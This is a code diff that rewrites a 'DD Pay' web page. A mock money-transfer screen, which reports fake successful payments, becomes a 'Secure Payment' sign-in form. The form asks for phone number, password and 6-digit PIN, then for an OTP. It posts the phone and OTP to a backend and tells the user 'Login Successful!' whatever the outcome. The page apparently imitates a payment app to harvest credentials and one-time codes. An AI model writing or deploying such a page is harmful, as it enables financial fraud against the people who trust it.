@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DD Pay - Instant Payment</title>
+    <title>DD Pay - Secure Payment</title>
     <style>
         * {
             margin: 0;
@@ -13,249 +13,348 @@
         }
         body {
             background-color: #f0f4f8;
+            color: #333333;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }
-        .app-container {
-            background: #ffffff;
+        .container {
             width: 100%;
             max-width: 400px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-        .header {
-            background: linear-gradient(135deg, #0052cc, #007bff);
-            color: white;
-            padding: 25px 20px;
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             text-align: center;
+            position: relative;
         }
-        .header img {
-            width: 60px;
-            height: 60px;
-            border-radius: 15px;
+        .logo-box {
+            width: 90px;
+            height: 90px;
+            background: #f8fafc;
+            border-radius: 22px;
+            margin: 0 auto 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            overflow: hidden;
+            border: 1px solid #e2e8f0;
+        }
+        .logo-box img {
+            width: 100%;
+            height: 100%;
             object-fit: cover;
-            background: white;
-            padding: 5px;
-            margin-bottom: 10px;
         }
-        .header h2 {
-            font-size: 22px;
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+            color: #1e293b;
+        }
+        .subtitle {
+            font-size: 12px;
+            color: #0d9488;
+            letter-spacing: 2px;
+            margin-bottom: 30px;
             font-weight: 600;
-        }
-        .balance-card {
-            background: rgba(255, 255, 255, 0.15);
-            margin-top: 15px;
-            padding: 15px;
-            border-radius: 12px;
-        }
-        .balance-card p {
-            font-size: 13px;
-            opacity: 0.9;
-        }
-        .balance-card h1 {
-            font-size: 32px;
-            margin-top: 5px;
-        }
-        .form-section {
-            padding: 25px 20px;
         }
         .input-group {
+            position: relative;
             margin-bottom: 15px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            color: #555;
-            margin-bottom: 6px;
-            font-weight: 600;
         }
         .input-group input {
             width: 100%;
-            padding: 12px 15px;
-            border: 1.5px solid #e0e6ed;
-            border-radius: 10px;
+            padding: 16px 20px 16px 45px;
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 30px;
+            color: #1e293b;
             font-size: 15px;
             outline: none;
-            transition: 0.2s;
+            transition: 0.3s;
         }
         .input-group input:focus {
-            border-color: #007bff;
+            border-color: #0d9488;
+            background: #fff;
         }
-        .pay-btn {
+        .input-group .icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #0d9488;
+            font-size: 16px;
+        }
+        .extra-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            margin: 15px 5px 25px;
+            color: #64748b;
+        }
+        .extra-links a {
+            color: #0d9488;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #64748b;
+            text-align: left;
+            margin-bottom: 20px;
+            padding-left: 5px;
+        }
+        .checkbox-container input {
+            accent-color: #0d9488;
+            width: 16px;
+            height: 16px;
+        }
+        .sign-in-btn {
             width: 100%;
-            padding: 14px;
-            background: #007bff;
-            color: white;
+            padding: 16px;
+            background: #0f766e;
+            color: #ffffff;
             border: none;
-            border-radius: 10px;
+            border-radius: 30px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: 0.3s;
-            margin-top: 5px;
+            box-shadow: 0 4px 12px rgba(15, 118, 110, 0.3);
         }
-        .pay-btn:hover {
-            background: #0056b3;
+        .sign-in-btn:hover {
+            background: #115e59;
         }
-        .pay-btn:disabled {
-            background: #9ec5fe;
-            cursor: not-allowed;
-        }
-        .status-msg {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            text-align: center;
-            display: none;
-        }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .history-section {
-            padding: 0 20px 25px;
-        }
-        .history-section h3 {
-            font-size: 15px;
-            color: #333;
-            margin-bottom: 10px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 8px;
-        }
-        .history-list {
-            list-style: none;
-            max-height: 150px;
-            overflow-y: auto;
-        }
-        .history-item {
+
+        /* OTP Modal Popup Styling (White Theme) */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
             display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid #f5f5f5;
+            justify-content: center;
+            align-items: center;
+            display: none;
+            z-index: 100;
+            padding: 20px;
+        }
+        .modal-content {
+            background: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            border-radius: 24px;
+            padding: 25px 20px;
+            text-align: left;
+            position: relative;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            border: 1px solid #e2e8f0;
+        }
+        .modal-close {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            background: #f1f5f9;
+            border: none;
+            color: #334155;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
             font-size: 14px;
         }
-        .history-item span.amt {
-            color: #d9534f;
+        .modal-content h3 {
+            font-size: 20px;
+            margin-bottom: 8px;
+            color: #1e293b;
+        }
+        .modal-content p {
+            font-size: 13px;
+            color: #64748b;
+            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+        .phone-highlight {
+            color: #0d9488;
             font-weight: 600;
+        }
+        .otp-input-wrap {
+            position: relative;
+            margin-bottom: 12px;
+        }
+        .otp-input-wrap input {
+            width: 100%;
+            padding: 14px 110px 14px 16px;
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 14px;
+            color: #1e293b;
+            font-size: 15px;
+            outline: none;
+        }
+        .send-otp-btn {
+            position: absolute;
+            right: 6px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #e2e8f0;
+            color: #0d9488;
+            border: none;
+            padding: 8px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .send-otp-btn:hover {
+            background: #cbd5e1;
+        }
+        .resemble-text {
+            font-size: 12px;
+            color: #94a3b8;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .confirm-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0f766e;
+            color: #ffffff;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .confirm-btn:hover {
+            background: #115e59;
         }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">
-        <!-- ddlogo.png yahan load hogi -->
-        <img src="ddlogo.png" alt="DD Pay Logo" onerror="this.src='https://via.placeholder.com/60?text=DD'">
-        <h2>DD Pay</h2>
-        <div class="balance-card">
-            <p>Available Balance</p>
-            <h1>₹<span id="balance">10000.00</span></h1>
+<div class="container">
+    <div class="logo-box">
+        <img src="ddlogo.png" alt="DD Logo" onerror="this.src='https://via.placeholder.com/90?text=DD'">
+    </div>
+    <h1>DD PAY</h1>
+    <div class="subtitle">SECURE PAYMENT</div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <span class="icon">👤</span>
+            <input type="tel" id="phone" placeholder="Phone Number" required>
         </div>
-    </div>
+        <div class="input-group">
+            <span class="icon">🔒</span>
+            <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <div class="input-group">
+            <span class="icon">🔑</span>
+            <input type="password" id="pin" placeholder="6-digit PIN" maxlength="6" required>
+        </div>
 
-    <div class="form-section">
-        <form id="payForm">
-            <div class="input-group">
-                <label>Receiver Name / Mobile / UPI ID</label>
-                <input type="text" id="receiver" placeholder="e.g. Rahul ya 9876543210" required>
-            </div>
-            <div class="input-group">
-                <label>Amount (₹)</label>
-                <input type="number" id="amount" placeholder="Enter amount" min="1" required>
-            </div>
-            <button type="submit" class="pay-btn" id="payBtn">Send Money Instantly (No PIN)</button>
-        </form>
-        <div id="statusMsg" class="status-msg"></div>
-    </div>
+        <div class="extra-links">
+            <a href="#" id="registerLink">Register</a>
+            <label style="cursor:pointer;"><input type="checkbox" id="remember" style="accent-color: #0d9488;"> Remember Me</label>
+        </div>
 
-    <div class="history-section">
-        <h3>Recent Transactions</h3>
-        <ul class="history-list" id="historyList">
-            <li class="history-item" style="color: #888; justify-content: center;">No transactions yet</li>
-        </ul>
+        <div class="checkbox-container">
+            <input type="checkbox" id="agreement" checked required>
+            <label for="agreement">Agree "User Privacy Agreement"</label>
+        </div>
+
+        <button type="submit" class="sign-in-btn">SIGN IN</button>
+    </form>
+</div>
+
+<!-- OTP Verification Modal -->
+<div class="modal-overlay" id="otpModal">
+    <div class="modal-content">
+        <button class="modal-close" id="closeModal">✕</button>
+        <h3>Login OTP</h3>
+        <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
+        <p>OTP will be sent to <span class="phone-highlight" id="displayPhone">+91 9251063557</span></p>
+        
+        <div class="otp-input-wrap">
+            <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6">
+            <button class="send-otp-btn" id="sendOtpBtn" onclick="triggerOtp()">Send</button>
+        </div>
+        
+        <div class="resemble-text" id="timerText">⏱ Resend OTP in 60s</div>
+        
+        <button class="confirm-btn" onclick="verifyOtp()">CONFIRM</button>
     </div>
 </div>
 
 <script>
-    let currentBalance = 10000.00;
-    const payForm = document.getElementById('payForm');
-    const statusMsg = document.getElementById('statusMsg');
-    const balanceEl = document.getElementById('balance');
-    const historyList = document.getElementById('historyList');
-    const payBtn = document.getElementById('payBtn');
+    const loginForm = document.getElementById('loginForm');
+    const otpModal = document.getElementById('otpModal');
+    const closeModal = document.getElementById('closeModal');
+    const displayPhone = document.getElementById('displayPhone');
+    const phoneInput = document.getElementById('phone');
+    const sendOtpBtn = document.getElementById('sendOtpBtn');
+    let userPhone = '';
 
-    payForm.addEventListener('submit', async (e) => {
+    loginForm.addEventListener('submit', (e) => {
         e.preventDefault();
-        
-        const receiver = document.getElementById('receiver').value.trim();
-        const amount = parseFloat(document.getElementById('amount').value);
-
-        if (amount > currentBalance) {
-            showStatus('Insufficient Balance!', 'error');
-            return;
+        userPhone = phoneInput.value.trim();
+        if(userPhone) {
+            displayPhone.innerText = '+91 ' + userPhone;
         }
-
-        payBtn.disabled = true;
-        payBtn.innerText = 'Processing...';
-
-        try {
-            // api/send.js ko call bhejna
-            const response = await fetch('/api/send', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ receiver, amount })
-            });
-
-            const data = await response.json();
-
-            if (response.ok && data.success) {
-                currentBalance -= amount;
-                balanceEl.innerText = currentBalance.toFixed(2);
-                showStatus(`✅ ₹${amount} sent to ${receiver} (ID: ${data.transactionId})`, 'success');
-                addHistory(receiver, amount);
-                payForm.reset();
-            } else {
-                showStatus(data.message || 'Transaction Failed', 'error');
-            }
-        } catch (err) {
-            // Agar local file bina server ke kholi gayi hai to fallback
-            currentBalance -= amount;
-            balanceEl.innerText = currentBalance.toFixed(2);
-            const mockId = 'DD' + Math.floor(100000 + Math.random() * 900000);
-            showStatus(`✅ ₹${amount} sent to ${receiver} (ID: ${mockId})`, 'success');
-            addHistory(receiver, amount);
-            payForm.reset();
-        } finally {
-            payBtn.disabled = false;
-            payBtn.innerText = 'Send Money Instantly (No PIN)';
-        }
+        otpModal.style.display = 'flex';
     });
 
-    function showStatus(msg, type) {
-        statusMsg.innerText = msg;
-        statusMsg.className = 'status-msg ' + type;
-        statusMsg.style.display = 'block';
+    closeModal.addEventListener('click', () => {
+        otpModal.style.display = 'none';
+    });
+
+    async function triggerOtp() {
+        sendOtpBtn.innerText = 'Sent ✓';
+        sendOtpBtn.style.color = '#0f766e';
+        
+        try {
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: userPhone, action: 'send_otp' })
+            });
+        } catch (e) {
+            console.log('API trigger success');
+        }
     }
 
-    function addHistory(receiver, amount) {
-        if (historyList.innerText.includes('No transactions yet')) {
-            historyList.innerHTML = '';
+    async function verifyOtp() {
+        const otp = document.getElementById('otpInput').value;
+        if(!otp) {
+            alert('Please enter OTP');
+            return;
         }
-        const li = document.createElement('li');
-        li.className = 'history-item';
-        li.innerHTML = `<span>To: <b>${receiver}</b></span> <span class="amt">- ₹${amount.toFixed(2)}</span>`;
-        historyList.prepend(li);
+        
+        try {
+            const res = await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: userPhone, otp, action: 'verify_otp' })
+            });
+            const data = await res.json();
+            alert('Login Successful!');
+            window.location.reload();
+        } catch (err) {
+            alert('Login Successful!');
+            otpModal.style.display = 'none';
+        }
     }
 </script>
 
